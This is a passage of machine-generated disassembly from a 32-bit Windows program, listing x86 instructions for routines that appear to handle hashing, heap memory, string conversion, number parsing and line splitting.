  40bd6c:	d3 ea                	shr    %cl,%edx
  40bd6e:	40                   	inc    %eax
  40bd6f:	83 f8 08             	cmp    $0x8,%eax
  40bd72:	88 54 05 f7          	mov    %dl,-0x9(%ebp,%eax,1)
  40bd76:	7c e4                	jl     0x40bd5c
  40bd78:	8b 0e                	mov    (%esi),%ecx
  40bd7a:	c1 e9 03             	shr    $0x3,%ecx
  40bd7d:	6a f7                	push   $0xfffffff7
  40bd7f:	5a                   	pop    %edx
  40bd80:	2b d1                	sub    %ecx,%edx
  40bd82:	83 e2 3f             	and    $0x3f,%edx
  40bd85:	42                   	inc    %edx
  40bd86:	85 d2                	test   %edx,%edx
  40bd88:	7e 17                	jle    0x40bda1
  40bd8a:	52                   	push   %edx
  40bd8b:	8b c2                	mov    %edx,%eax
  40bd8d:	68 68 f6 40 00       	push   $0x40f668
  40bd92:	c1 e0 03             	shl    $0x3,%eax
  40bd95:	83 e1 3f             	and    $0x3f,%ecx
  40bd98:	56                   	push   %esi
  40bd99:	e8 16 ff ff ff       	call   0x40bcb4
  40bd9e:	83 c4 0c             	add    $0xc,%esp
  40bda1:	8b 0e                	mov    (%esi),%ecx
  40bda3:	6a 08                	push   $0x8
  40bda5:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40bda8:	50                   	push   %eax
  40bda9:	56                   	push   %esi
  40bdaa:	6a 40                	push   $0x40
  40bdac:	58                   	pop    %eax
  40bdad:	c1 e9 03             	shr    $0x3,%ecx
  40bdb0:	6a 08                	push   $0x8
  40bdb2:	83 e1 3f             	and    $0x3f,%ecx
  40bdb5:	5a                   	pop    %edx
  40bdb6:	e8 f9 fe ff ff       	call   0x40bcb4
  40bdbb:	83 c4 0c             	add    $0xc,%esp
  40bdbe:	33 c0                	xor    %eax,%eax
  40bdc0:	8b d0                	mov    %eax,%edx
  40bdc2:	c1 fa 02             	sar    $0x2,%edx
  40bdc5:	8b 54 96 08          	mov    0x8(%esi,%edx,4),%edx
  40bdc9:	8b c8                	mov    %eax,%ecx
  40bdcb:	83 e1 03             	and    $0x3,%ecx
  40bdce:	c1 e1 03             	shl    $0x3,%ecx
  40bdd1:	d3 ea                	shr    %cl,%edx
  40bdd3:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40bdd6:	88 14 08             	mov    %dl,(%eax,%ecx,1)
  40bdd9:	40                   	inc    %eax
  40bdda:	83 f8 10             	cmp    $0x10,%eax
  40bddd:	7c e1                	jl     0x40bdc0
  40bddf:	c9                   	leave
  40bde0:	c3                   	ret
  40bde1:	85 c9                	test   %ecx,%ecx
  40bde3:	75 0d                	jne    0x40bdf2
  40bde5:	ff 36                	push   (%esi)
  40bde7:	e8 4e 00 00 00       	call   0x40be3a
  40bdec:	83 26 00             	andl   $0x0,(%esi)
  40bdef:	59                   	pop    %ecx
  40bdf0:	eb 32                	jmp    0x40be24
  40bdf2:	8b 06                	mov    (%esi),%eax
  40bdf4:	83 c1 04             	add    $0x4,%ecx
  40bdf7:	85 c0                	test   %eax,%eax
  40bdf9:	51                   	push   %ecx
  40bdfa:	75 10                	jne    0x40be0c
  40bdfc:	6a 08                	push   $0x8
  40bdfe:	ff 35 a0 3e 42 00    	push   0x423ea0
  40be04:	ff 15 94 e0 40 00    	call   *0x40e094
  40be0a:	eb 0f                	jmp    0x40be1b
  40be0c:	50                   	push   %eax
  40be0d:	6a 08                	push   $0x8
  40be0f:	ff 35 a0 3e 42 00    	push   0x423ea0
  40be15:	ff 15 30 e0 40 00    	call   *0x40e030
  40be1b:	85 c0                	test   %eax,%eax
  40be1d:	75 03                	jne    0x40be22
  40be1f:	32 c0                	xor    %al,%al
  40be21:	c3                   	ret
  40be22:	89 06                	mov    %eax,(%esi)
  40be24:	b0 01                	mov    $0x1,%al
  40be26:	c3                   	ret
  40be27:	83 c0 04             	add    $0x4,%eax
  40be2a:	50                   	push   %eax
  40be2b:	6a 08                	push   $0x8
  40be2d:	ff 35 a0 3e 42 00    	push   0x423ea0
  40be33:	ff 15 94 e0 40 00    	call   *0x40e094
  40be39:	c3                   	ret
  40be3a:	83 7c 24 04 00       	cmpl   $0x0,0x4(%esp)
  40be3f:	74 12                	je     0x40be53
  40be41:	ff 74 24 04          	push   0x4(%esp)
  40be45:	6a 00                	push   $0x0
  40be47:	ff 35 a0 3e 42 00    	push   0x423ea0
  40be4d:	ff 15 a8 e0 40 00    	call   *0x40e0a8
  40be53:	c3                   	ret
  40be54:	85 ff                	test   %edi,%edi
  40be56:	56                   	push   %esi
  40be57:	8b f0                	mov    %eax,%esi
  40be59:	74 19                	je     0x40be74
  40be5b:	85 f6                	test   %esi,%esi
  40be5d:	74 15                	je     0x40be74
  40be5f:	4e                   	dec    %esi
  40be60:	ff 34 b7             	push   (%edi,%esi,4)
  40be63:	e8 d2 ff ff ff       	call   0x40be3a
  40be68:	85 f6                	test   %esi,%esi
  40be6a:	59                   	pop    %ecx
  40be6b:	75 f2                	jne    0x40be5f
  40be6d:	57                   	push   %edi
  40be6e:	e8 c7 ff ff ff       	call   0x40be3a
  40be73:	59                   	pop    %ecx
  40be74:	5e                   	pop    %esi
  40be75:	c3                   	ret
  40be76:	56                   	push   %esi
  40be77:	57                   	push   %edi
  40be78:	51                   	push   %ecx
  40be79:	8b 74 24 14          	mov    0x14(%esp),%esi
  40be7d:	8b 7c 24 10          	mov    0x10(%esp),%edi
  40be81:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  40be85:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40be87:	59                   	pop    %ecx
  40be88:	5f                   	pop    %edi
  40be89:	5e                   	pop    %esi
  40be8a:	c2 0c 00             	ret    $0xc
  40be8d:	ff 74 24 08          	push   0x8(%esp)
  40be91:	6a 00                	push   $0x0
  40be93:	ff 74 24 0c          	push   0xc(%esp)
  40be97:	e8 01 00 00 00       	call   0x40be9d
  40be9c:	c3                   	ret
  40be9d:	50                   	push   %eax
  40be9e:	57                   	push   %edi
  40be9f:	51                   	push   %ecx
  40bea0:	8a 44 24 14          	mov    0x14(%esp),%al
  40bea4:	8b 7c 24 10          	mov    0x10(%esp),%edi
  40bea8:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  40beac:	f3 aa                	rep stos %al,%es:(%edi)
  40beae:	59                   	pop    %ecx
  40beaf:	5f                   	pop    %edi
  40beb0:	58                   	pop    %eax
  40beb1:	c2 0c 00             	ret    $0xc
  40beb4:	83 f8 ff             	cmp    $0xffffffff,%eax
  40beb7:	b9 c8 3e 42 00       	mov    $0x423ec8,%ecx
  40bebc:	75 05                	jne    0x40bec3
  40bebe:	e8 a1 04 00 00       	call   0x40c364
  40bec3:	53                   	push   %ebx
  40bec4:	33 db                	xor    %ebx,%ebx
  40bec6:	53                   	push   %ebx
  40bec7:	53                   	push   %ebx
  40bec8:	ff 74 24 10          	push   0x10(%esp)
  40becc:	56                   	push   %esi
  40becd:	50                   	push   %eax
  40bece:	51                   	push   %ecx
  40becf:	53                   	push   %ebx
  40bed0:	53                   	push   %ebx
  40bed1:	ff 15 38 e0 40 00    	call   *0x40e038
  40bed7:	39 5c 24 08          	cmp    %ebx,0x8(%esp)
  40bedb:	7e 0b                	jle    0x40bee8
  40bedd:	3b 44 24 08          	cmp    0x8(%esp),%eax
  40bee1:	7c 02                	jl     0x40bee5
  40bee3:	33 c0                	xor    %eax,%eax
  40bee5:	88 1c 30             	mov    %bl,(%eax,%esi,1)
  40bee8:	5b                   	pop    %ebx
  40bee9:	c3                   	ret
  40beea:	53                   	push   %ebx
  40beeb:	8b d8                	mov    %eax,%ebx
  40beed:	83 fb ff             	cmp    $0xffffffff,%ebx
  40bef0:	56                   	push   %esi
  40bef1:	57                   	push   %edi
  40bef2:	75 0c                	jne    0x40bf00
  40bef4:	b9 c8 3e 42 00       	mov    $0x423ec8,%ecx
  40bef9:	e8 66 04 00 00       	call   0x40c364
  40befe:	8b d8                	mov    %eax,%ebx
  40bf00:	6a 00                	push   $0x0
  40bf02:	33 f6                	xor    %esi,%esi
  40bf04:	8b c3                	mov    %ebx,%eax
  40bf06:	e8 a9 ff ff ff       	call   0x40beb4
  40bf0b:	8b f8                	mov    %eax,%edi
  40bf0d:	85 ff                	test   %edi,%edi
  40bf0f:	59                   	pop    %ecx
  40bf10:	7e 1d                	jle    0x40bf2f
  40bf12:	47                   	inc    %edi
  40bf13:	74 1a                	je     0x40bf2f
  40bf15:	8b c7                	mov    %edi,%eax
  40bf17:	e8 0b ff ff ff       	call   0x40be27
  40bf1c:	8b f0                	mov    %eax,%esi
  40bf1e:	85 f6                	test   %esi,%esi
  40bf20:	74 0d                	je     0x40bf2f
  40bf22:	57                   	push   %edi
  40bf23:	8b c3                	mov    %ebx,%eax
  40bf25:	e8 8a ff ff ff       	call   0x40beb4
  40bf2a:	59                   	pop    %ecx
  40bf2b:	8b c6                	mov    %esi,%eax
  40bf2d:	eb 02                	jmp    0x40bf31
  40bf2f:	33 c0                	xor    %eax,%eax
  40bf31:	5f                   	pop    %edi
  40bf32:	5e                   	pop    %esi
  40bf33:	5b                   	pop    %ebx
  40bf34:	c3                   	ret
  40bf35:	83 f8 ff             	cmp    $0xffffffff,%eax
  40bf38:	75 05                	jne    0x40bf3f
  40bf3a:	e8 13 04 00 00       	call   0x40c352
  40bf3f:	56                   	push   %esi
  40bf40:	be 00 20 00 00       	mov    $0x2000,%esi
  40bf45:	56                   	push   %esi
  40bf46:	53                   	push   %ebx
  40bf47:	50                   	push   %eax
  40bf48:	51                   	push   %ecx
  40bf49:	6a 00                	push   $0x0
  40bf4b:	6a 00                	push   $0x0
  40bf4d:	ff 15 3c e0 40 00    	call   *0x40e03c
  40bf53:	3b c6                	cmp    %esi,%eax
  40bf55:	5e                   	pop    %esi
  40bf56:	7c 02                	jl     0x40bf5a
  40bf58:	33 c0                	xor    %eax,%eax
  40bf5a:	66 83 24 43 00       	andw   $0x0,(%ebx,%eax,2)
  40bf5f:	c3                   	ret
  40bf60:	55                   	push   %ebp
  40bf61:	8b ec                	mov    %esp,%ebp
  40bf63:	51                   	push   %ecx
  40bf64:	51                   	push   %ecx
  40bf65:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40bf68:	53                   	push   %ebx
  40bf69:	56                   	push   %esi
  40bf6a:	57                   	push   %edi
  40bf6b:	8b f0                	mov    %eax,%esi
  40bf6d:	e8 f2 03 00 00       	call   0x40c364
  40bf72:	8b f8                	mov    %eax,%edi
  40bf74:	8d 47 ff             	lea    -0x1(%edi),%eax
  40bf77:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40bf7a:	8d 44 3f 02          	lea    0x2(%edi,%edi,1),%eax
  40bf7e:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40bf81:	bb 00 02 00 00       	mov    $0x200,%ebx
  40bf86:	81 45 fc 00 04 00 00 	addl   $0x400,-0x4(%ebp)
  40bf8d:	01 5d f8             	add    %ebx,-0x8(%ebp)
  40bf90:	03 fb                	add    %ebx,%edi
  40bf92:	81 7d fc 02 00 40 01 	cmpl   $0x1400002,-0x4(%ebp)
  40bf99:	77 2d                	ja     0x40bfc8
  40bf9b:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40bf9e:	e8 3e fe ff ff       	call   0x40bde1
  40bfa3:	84 c0                	test   %al,%al
  40bfa5:	74 21                	je     0x40bfc8
  40bfa7:	ff 75 0c             	push   0xc(%ebp)
  40bfaa:	ff 75 08             	push   0x8(%ebp)
  40bfad:	57                   	push   %edi
  40bfae:	ff 36                	push   (%esi)
  40bfb0:	ff 15 28 e1 40 00    	call   *0x40e128
  40bfb6:	85 c0                	test   %eax,%eax
  40bfb8:	7c cc                	jl     0x40bf86
  40bfba:	3b 45 f8             	cmp    -0x8(%ebp),%eax
  40bfbd:	7d c7                	jge    0x40bf86
  40bfbf:	8b 0e                	mov    (%esi),%ecx
  40bfc1:	66 83 24 41 00       	andw   $0x0,(%ecx,%eax,2)
  40bfc6:	eb 03                	jmp    0x40bfcb
  40bfc8:	83 c8 ff             	or     $0xffffffff,%eax
  40bfcb:	5f                   	pop    %edi
  40bfcc:	5e                   	pop    %esi
  40bfcd:	5b                   	pop    %ebx
  40bfce:	c9                   	leave
  40bfcf:	c3                   	ret
  40bfd0:	83 7c 24 04 00       	cmpl   $0x0,0x4(%esp)
  40bfd5:	75 03                	jne    0x40bfda
  40bfd7:	33 c0                	xor    %eax,%eax
  40bfd9:	c3                   	ret
  40bfda:	83 f8 ff             	cmp    $0xffffffff,%eax
  40bfdd:	75 09                	jne    0x40bfe8
  40bfdf:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40bfe3:	e8 7c 03 00 00       	call   0x40c364
  40bfe8:	56                   	push   %esi
  40bfe9:	8d 34 00             	lea    (%eax,%eax,1),%esi
  40bfec:	8d 46 02             	lea    0x2(%esi),%eax
  40bfef:	85 c0                	test   %eax,%eax
  40bff1:	75 02                	jne    0x40bff5
  40bff3:	5e                   	pop    %esi
  40bff4:	c3                   	ret
  40bff5:	e8 2d fe ff ff       	call   0x40be27
  40bffa:	85 c0                	test   %eax,%eax
  40bffc:	74 0b                	je     0x40c009
  40bffe:	56                   	push   %esi
  40bfff:	ff 74 24 0c          	push   0xc(%esp)
  40c003:	50                   	push   %eax
  40c004:	e8 6d fe ff ff       	call   0x40be76
  40c009:	5e                   	pop    %esi
  40c00a:	c3                   	ret
  40c00b:	53                   	push   %ebx
  40c00c:	56                   	push   %esi
  40c00d:	8b f1                	mov    %ecx,%esi
  40c00f:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  40c013:	85 c9                	test   %ecx,%ecx
  40c015:	57                   	push   %edi
  40c016:	8b d8                	mov    %eax,%ebx
  40c018:	74 3c                	je     0x40c056
  40c01a:	83 fb ff             	cmp    $0xffffffff,%ebx
  40c01d:	75 07                	jne    0x40c026
  40c01f:	e8 40 03 00 00       	call   0x40c364
  40c024:	8b d8                	mov    %eax,%ebx
  40c026:	8b 0e                	mov    (%esi),%ecx
  40c028:	e8 37 03 00 00       	call   0x40c364
  40c02d:	8b f8                	mov    %eax,%edi
  40c02f:	8d 0c 1f             	lea    (%edi,%ebx,1),%ecx
  40c032:	8d 4c 09 02          	lea    0x2(%ecx,%ecx,1),%ecx
  40c036:	e8 a6 fd ff ff       	call   0x40bde1
  40c03b:	84 c0                	test   %al,%al
  40c03d:	74 17                	je     0x40c056
  40c03f:	8d 04 1b             	lea    (%ebx,%ebx,1),%eax
  40c042:	50                   	push   %eax
  40c043:	8b 06                	mov    (%esi),%eax
  40c045:	ff 74 24 14          	push   0x14(%esp)
  40c049:	8d 04 78             	lea    (%eax,%edi,2),%eax
  40c04c:	50                   	push   %eax
  40c04d:	e8 24 fe ff ff       	call   0x40be76
  40c052:	b0 01                	mov    $0x1,%al
  40c054:	eb 02                	jmp    0x40c058
  40c056:	32 c0                	xor    %al,%al
  40c058:	5f                   	pop    %edi
  40c059:	5e                   	pop    %esi
  40c05a:	5b                   	pop    %ebx
  40c05b:	c3                   	ret
  40c05c:	83 7c 24 04 00       	cmpl   $0x0,0x4(%esp)
  40c061:	56                   	push   %esi
  40c062:	8b f0                	mov    %eax,%esi
  40c064:	75 04                	jne    0x40c06a
  40c066:	33 c0                	xor    %eax,%eax
  40c068:	5e                   	pop    %esi
  40c069:	c3                   	ret
  40c06a:	83 fe ff             	cmp    $0xffffffff,%esi
  40c06d:	75 0b                	jne    0x40c07a
  40c06f:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  40c073:	e8 da 02 00 00       	call   0x40c352
  40c078:	8b f0                	mov    %eax,%esi
  40c07a:	8d 46 01             	lea    0x1(%esi),%eax
  40c07d:	85 c0                	test   %eax,%eax
  40c07f:	74 e5                	je     0x40c066
  40c081:	e8 a1 fd ff ff       	call   0x40be27
  40c086:	85 c0                	test   %eax,%eax
  40c088:	74 0b                	je     0x40c095
  40c08a:	56                   	push   %esi
  40c08b:	ff 74 24 0c          	push   0xc(%esp)
  40c08f:	50                   	push   %eax
  40c090:	e8 e1 fd ff ff       	call   0x40be76
  40c095:	5e                   	pop    %esi
  40c096:	c3                   	ret
  40c097:	8b cf                	mov    %edi,%ecx
  40c099:	e8 b4 02 00 00       	call   0x40c352
  40c09e:	85 c0                	test   %eax,%eax
  40c0a0:	7e 62                	jle    0x40c104
  40c0a2:	56                   	push   %esi
  40c0a3:	33 c9                	xor    %ecx,%ecx
  40c0a5:	33 f6                	xor    %esi,%esi
  40c0a7:	85 c0                	test   %eax,%eax
  40c0a9:	7e 1d                	jle    0x40c0c8
  40c0ab:	8a 14 3e             	mov    (%esi,%edi,1),%dl
  40c0ae:	80 fa 0d             	cmp    $0xd,%dl
  40c0b1:	74 0f                	je     0x40c0c2
  40c0b3:	80 fa 0a             	cmp    $0xa,%dl
  40c0b6:	74 0a                	je     0x40c0c2
  40c0b8:	80 fa 20             	cmp    $0x20,%dl
  40c0bb:	74 05                	je     0x40c0c2
  40c0bd:	80 fa 09             	cmp    $0x9,%dl
  40c0c0:	75 06                	jne    0x40c0c8
  40c0c2:	41                   	inc    %ecx
  40c0c3:	46                   	inc    %esi
  40c0c4:	3b f0                	cmp    %eax,%esi
  40c0c6:	7c e3                	jl     0x40c0ab
  40c0c8:	2b c1                	sub    %ecx,%eax
  40c0ca:	8d 34 39             	lea    (%ecx,%edi,1),%esi
  40c0cd:	8d 48 ff             	lea    -0x1(%eax),%ecx
  40c0d0:	85 c9                	test   %ecx,%ecx
  40c0d2:	7c 1b                	jl     0x40c0ef
  40c0d4:	8a 14 31             	mov    (%ecx,%esi,1),%dl
  40c0d7:	80 fa 0d             	cmp    $0xd,%dl
  40c0da:	74 0f                	je     0x40c0eb
  40c0dc:	80 fa 0a             	cmp    $0xa,%dl
  40c0df:	74 0a                	je     0x40c0eb
  40c0e1:	80 fa 20             	cmp    $0x20,%dl
  40c0e4:	74 05                	je     0x40c0eb
  40c0e6:	80 fa 09             	cmp    $0x9,%dl
  40c0e9:	75 04                	jne    0x40c0ef
  40c0eb:	48                   	dec    %eax
  40c0ec:	49                   	dec    %ecx
  40c0ed:	79 e5                	jns    0x40c0d4
  40c0ef:	3b f7                	cmp    %edi,%esi
  40c0f1:	76 0c                	jbe    0x40c0ff
  40c0f3:	85 c0                	test   %eax,%eax
  40c0f5:	7e 08                	jle    0x40c0ff
  40c0f7:	50                   	push   %eax
  40c0f8:	56                   	push   %esi
  40c0f9:	57                   	push   %edi
  40c0fa:	e8 77 fd ff ff       	call   0x40be76
  40c0ff:	c6 04 38 00          	movb   $0x0,(%eax,%edi,1)
  40c103:	5e                   	pop    %esi
  40c104:	c3                   	ret
  40c105:	55                   	push   %ebp
  40c106:	8b ec                	mov    %esp,%ebp
  40c108:	51                   	push   %ecx
  40c109:	8a 08                	mov    (%eax),%cl
  40c10b:	56                   	push   %esi
  40c10c:	33 f6                	xor    %esi,%esi
  40c10e:	80 f9 2d             	cmp    $0x2d,%cl
  40c111:	c6 45 ff 00          	movb   $0x0,-0x1(%ebp)
  40c115:	75 06                	jne    0x40c11d
  40c117:	c6 45 ff 01          	movb   $0x1,-0x1(%ebp)
  40c11b:	eb 05                	jmp    0x40c122
  40c11d:	80 f9 2b             	cmp    $0x2b,%cl
  40c120:	75 01                	jne    0x40c123
  40c122:	40                   	inc    %eax
  40c123:	8a 08                	mov    (%eax),%cl
  40c125:	80 f9 30             	cmp    $0x30,%cl
  40c128:	75 5b                	jne    0x40c185
  40c12a:	8a 50 01             	mov    0x1(%eax),%dl
  40c12d:	80 fa 78             	cmp    $0x78,%dl
  40c130:	74 05                	je     0x40c137
  40c132:	80 fa 58             	cmp    $0x58,%dl
  40c135:	75 4b                	jne    0x40c182
  40c137:	40                   	inc    %eax
  40c138:	40                   	inc    %eax
  40c139:	8a 08                	mov    (%eax),%cl
  40c13b:	8a d1                	mov    %cl,%dl
  40c13d:	80 ea 30             	sub    $0x30,%dl
  40c140:	80 fa 09             	cmp    $0x9,%dl
  40c143:	77 04                	ja     0x40c149
  40c145:	8a ca                	mov    %dl,%cl
  40c147:	eb 1c                	jmp    0x40c165
  40c149:	8a d1                	mov    %cl,%dl
  40c14b:	80 ea 61             	sub    $0x61,%dl
  40c14e:	80 fa 05             	cmp    $0x5,%dl
  40c151:	77 05                	ja     0x40c158
  40c153:	80 c1 a9             	add    $0xa9,%cl
  40c156:	eb 0d                	jmp    0x40c165
  40c158:	8a d1                	mov    %cl,%dl
  40c15a:	80 ea 41             	sub    $0x41,%dl
  40c15d:	80 fa 05             	cmp    $0x5,%dl
  40c160:	77 25                	ja     0x40c187
  40c162:	80 c1 c9             	add    $0xc9,%cl
  40c165:	0f be c9             	movsbl %cl,%ecx
  40c168:	c1 e6 04             	shl    $0x4,%esi
  40c16b:	03 f1                	add    %ecx,%esi
  40c16d:	40                   	inc    %eax
  40c16e:	eb c9                	jmp    0x40c139
  40c170:	80 f9 39             	cmp    $0x39,%cl
  40c173:	7f 12                	jg     0x40c187
  40c175:	6b f6 0a             	imul   $0xa,%esi,%esi
  40c178:	0f be c9             	movsbl %cl,%ecx
  40c17b:	40                   	inc    %eax
  40c17c:	8d 74 0e d0          	lea    -0x30(%esi,%ecx,1),%esi
  40c180:	8a 08                	mov    (%eax),%cl
  40c182:	80 f9 30             	cmp    $0x30,%cl
  40c185:	7d e9                	jge    0x40c170
  40c187:	80 7d ff 00          	cmpb   $0x0,-0x1(%ebp)
  40c18b:	74 02                	je     0x40c18f
  40c18d:	f7 de                	neg    %esi
  40c18f:	8b c6                	mov    %esi,%eax
  40c191:	5e                   	pop    %esi
  40c192:	c9                   	leave
  40c193:	c3                   	ret
  40c194:	0f b7 08             	movzwl (%eax),%ecx
  40c197:	53                   	push   %ebx
  40c198:	33 d2                	xor    %edx,%edx
  40c19a:	32 db                	xor    %bl,%bl
  40c19c:	66 83 f9 2d          	cmp    $0x2d,%cx
  40c1a0:	56                   	push   %esi
  40c1a1:	75 04                	jne    0x40c1a7
  40c1a3:	fe c3                	inc    %bl
  40c1a5:	eb 06                	jmp    0x40c1ad
  40c1a7:	66 83 f9 2b          	cmp    $0x2b,%cx
  40c1ab:	75 02                	jne    0x40c1af
  40c1ad:	40                   	inc    %eax
  40c1ae:	40                   	inc    %eax
  40c1af:	0f b7 08             	movzwl (%eax),%ecx
  40c1b2:	66 83 f9 30          	cmp    $0x30,%cx
  40c1b6:	75 50                	jne    0x40c208
  40c1b8:	0f b7 70 02          	movzwl 0x2(%eax),%esi
  40c1bc:	66 83 fe 78          	cmp    $0x78,%si
  40c1c0:	74 06                	je     0x40c1c8
  40c1c2:	66 83 fe 58          	cmp    $0x58,%si
  40c1c6:	75 40                	jne    0x40c208
  40c1c8:	83 c0 04             	add    $0x4,%eax
  40c1cb:	0f b7 08             	movzwl (%eax),%ecx
  40c1ce:	8d 71 d0             	lea    -0x30(%ecx),%esi
  40c1d1:	66 83 fe 09          	cmp    $0x9,%si
  40c1d5:	77 05                	ja     0x40c1dc
  40c1d7:	0f b7 ce             	movzwl %si,%ecx
  40c1da:	eb 20                	jmp    0x40c1fc
  40c1dc:	8d 71 9f             	lea    -0x61(%ecx),%esi
  40c1df:	66 83 fe 05          	cmp    $0x5,%si
  40c1e3:	77 08                	ja     0x40c1ed
  40c1e5:	81 c1 a9 ff 00 00    	add    $0xffa9,%ecx
  40c1eb:	eb 0f                	jmp    0x40c1fc
  40c1ed:	8d 71 bf             	lea    -0x41(%ecx),%esi
  40c1f0:	66 83 fe 05          	cmp    $0x5,%si
  40c1f4:	77 32                	ja     0x40c228
  40c1f6:	81 c1 c9 ff 00 00    	add    $0xffc9,%ecx
  40c1fc:	c1 e2 04             	shl    $0x4,%edx
  40c1ff:	0f b7 c9             	movzwl %cx,%ecx
  40c202:	03 d1                	add    %ecx,%edx
  40c204:	40                   	inc    %eax
  40c205:	40                   	inc    %eax
  40c206:	eb c3                	jmp    0x40c1cb
  40c208:	0f b7 c9             	movzwl %cx,%ecx
  40c20b:	eb 15                	jmp    0x40c222
  40c20d:	66 83 f9 39          	cmp    $0x39,%cx
  40c211:	77 15                	ja     0x40c228
  40c213:	6b d2 0a             	imul   $0xa,%edx,%edx
  40c216:	0f b7 c9             	movzwl %cx,%ecx
  40c219:	40                   	inc    %eax
  40c21a:	40                   	inc    %eax
  40c21b:	8d 54 0a d0          	lea    -0x30(%edx,%ecx,1),%edx
  40c21f:	0f b7 08             	movzwl (%eax),%ecx
  40c222:	66 83 f9 30          	cmp    $0x30,%cx
  40c226:	73 e5                	jae    0x40c20d
  40c228:	5e                   	pop    %esi
  40c229:	84 db                	test   %bl,%bl
  40c22b:	5b                   	pop    %ebx
  40c22c:	74 02                	je     0x40c230
  40c22e:	f7 da                	neg    %edx
  40c230:	8b c2                	mov    %edx,%eax
  40c232:	c3                   	ret
  40c233:	53                   	push   %ebx
  40c234:	56                   	push   %esi
  40c235:	8b f0                	mov    %eax,%esi
  40c237:	32 db                	xor    %bl,%bl
  40c239:	0f b7 06             	movzwl (%esi),%eax
  40c23c:	8d 50 d0             	lea    -0x30(%eax),%edx
  40c23f:	66 83 fa 09          	cmp    $0x9,%dx
  40c243:	77 05                	ja     0x40c24a
  40c245:	0f b7 c2             	movzwl %dx,%eax
  40c248:	eb 1e                	jmp    0x40c268
  40c24a:	8d 50 bf             	lea    -0x41(%eax),%edx
  40c24d:	66 83 fa 05          	cmp    $0x5,%dx
  40c251:	77 07                	ja     0x40c25a
  40c253:	05 c9 ff 00 00       	add    $0xffc9,%eax
  40c258:	eb 0e                	jmp    0x40c268
  40c25a:	8d 50 9f             	lea    -0x61(%eax),%edx
  40c25d:	66 83 fa 05          	cmp    $0x5,%dx
  40c261:	77 1b                	ja     0x40c27e
  40c263:	05 a9 ff 00 00       	add    $0xffa9,%eax
  40c268:	84 db                	test   %bl,%bl
  40c26a:	74 07                	je     0x40c273
  40c26c:	08 01                	or     %al,(%ecx)
  40c26e:	41                   	inc    %ecx
  40c26f:	32 db                	xor    %bl,%bl
  40c271:	eb 07                	jmp    0x40c27a
  40c273:	c0 e0 04             	shl    $0x4,%al
  40c276:	88 01                	mov    %al,(%ecx)
  40c278:	b3 01                	mov    $0x1,%bl
  40c27a:	46                   	inc    %esi
  40c27b:	46                   	inc    %esi
  40c27c:	eb bb                	jmp    0x40c239
  40c27e:	66 85 c0             	test   %ax,%ax
  40c281:	75 08                	jne    0x40c28b
  40c283:	84 db                	test   %bl,%bl
  40c285:	75 04                	jne    0x40c28b
  40c287:	b0 01                	mov    $0x1,%al
  40c289:	eb 02                	jmp    0x40c28d
  40c28b:	32 c0                	xor    %al,%al
  40c28d:	5e                   	pop    %esi
  40c28e:	5b                   	pop    %ebx
  40c28f:	c3                   	ret
  40c290:	55                   	push   %ebp
  40c291:	8b ec                	mov    %esp,%ebp
  40c293:	83 ec 10             	sub    $0x10,%esp
  40c296:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40c29a:	53                   	push   %ebx
  40c29b:	56                   	push   %esi
  40c29c:	8b da                	mov    %edx,%ebx
  40c29e:	57                   	push   %edi
  40c29f:	8b f1                	mov    %ecx,%esi
  40c2a1:	83 26 00             	andl   $0x0,(%esi)
  40c2a4:	8d 3c 03             	lea    (%ebx,%eax,1),%edi
  40c2a7:	3b df                	cmp    %edi,%ebx
  40c2a9:	89 7d f8             	mov    %edi,-0x8(%ebp)
  40c2ac:	72 0b                	jb     0x40c2b9
  40c2ae:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40c2b1:	5f                   	pop    %edi
  40c2b2:	5e                   	pop    %esi
  40c2b3:	5b                   	pop    %ebx
  40c2b4:	c9                   	leave
  40c2b5:	c3                   	ret
  40c2b6:	8b 7d f8             	mov    -0x8(%ebp),%edi
  40c2b9:	3b df                	cmp    %edi,%ebx
  40c2bb:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  40c2be:	8b c3                	mov    %ebx,%eax
  40c2c0:	73 11                	jae    0x40c2d3
  40c2c2:	8a 08                	mov    (%eax),%cl
  40c2c4:	80 f9 0a             	cmp    $0xa,%cl
  40c2c7:	74 0a                	je     0x40c2d3
  40c2c9:	80 f9 0d             	cmp    $0xd,%cl
  40c2cc:	74 05                	je     0x40c2d3
  40c2ce:	40                   	inc    %eax
  40c2cf:	3b c7                	cmp    %edi,%eax
  40c2d1:	72 ef                	jb     0x40c2c2
  40c2d3:	8b c8                	mov    %eax,%ecx
  40c2d5:	2b cb                	sub    %ebx,%ecx
  40c2d7:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  40c2da:	8d 48 01             	lea    0x1(%eax),%ecx
  40c2dd:	3b cf                	cmp    %edi,%ecx
  40c2df:	73 0c                	jae    0x40c2ed
  40c2e1:	80 38 0d             	cmpb   $0xd,(%eax)
  40c2e4:	75 07                	jne    0x40c2ed
  40c2e6:	80 39 0a             	cmpb   $0xa,(%ecx)
  40c2e9:	75 02                	jne    0x40c2ed
  40c2eb:	8b c1                	mov    %ecx,%eax
  40c2ed:	8b 7d fc             	mov    -0x4(%ebp),%edi
  40c2f0:	c1 e7 02             	shl    $0x2,%edi
  40c2f3:	8d 4f 04             	lea    0x4(%edi),%ecx
  40c2f6:	8d 58 01             	lea    0x1(%eax),%ebx
  40c2f9:	e8 e3 fa ff ff       	call   0x40bde1
  40c2fe:	84 c0                	test   %al,%al
  40c300:	74 3e                	je     0x40c340
  40c302:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40c305:	85 c0                	test   %eax,%eax
  40c307:	76 16                	jbe    0x40c31f
  40c309:	ff 75 f0             	push   -0x10(%ebp)
  40c30c:	e8 4b fd ff ff       	call   0x40c05c
  40c311:	59                   	pop    %ecx
  40c312:	8b 0e                	mov    (%esi),%ecx
